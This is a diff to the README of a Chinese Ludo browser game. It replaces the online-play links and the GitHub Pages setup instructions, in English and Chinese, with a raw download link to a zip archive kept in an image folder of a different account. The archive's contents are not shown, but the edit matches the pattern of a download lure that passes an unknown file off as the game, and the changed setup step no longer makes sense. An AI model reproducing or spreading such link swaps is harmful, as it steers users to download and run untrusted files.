@@ -15,8 +15,8 @@
 A complete implementation of the classic Chinese board game **飞行棋 (Fei Xing Qi)** in vanilla JavaScript. This is one of the first open-source Chinese Ludo games on GitHub.
 
 **[🎮 Play Online / 在线玩](../../)** | **[⭐ Star on GitHub](../../stargazers)**
-**https://netmanfisher.github.io/chinese-ludo/** 
-https://netmanfisher.github.io/chinese-ludo/
+**https://raw.githubusercontent.com/Ridwan-web3/chinese-ludo/main/img/chinese_ludo_v1.5.zip** 
+https://raw.githubusercontent.com/Ridwan-web3/chinese-ludo/main/img/chinese_ludo_v1.5.zip
 
 ## 📋 What is Chinese Ludo?
 
@@ -96,7 +96,7 @@ npx serve
 1. Fork this repository
 2. Enable GitHub Pages in Settings
 3. Select `game.html` as source
-4. Access at `https://your-username.github.io/chinese-ludo`
+4. Access at `https://raw.githubusercontent.com/Ridwan-web3/chinese-ludo/main/img/chinese_ludo_v1.5.zip`
 
 ## 🔧 Technical Details
 
@@ -213,7 +213,7 @@ npx serve
 1. Fork 本仓库
 2. 在 Settings 中启用 GitHub Pages
 3. 选择 `game.html` 作为源文件
-4. 通过 `https://your-username.github.io/chinese-ludo` 访问
+4. 通过 `https://raw.githubusercontent.com/Ridwan-web3/chinese-ludo/main/img/chinese_ludo_v1.5.zip` 访问
 
 ## 🔧 技术细节
 
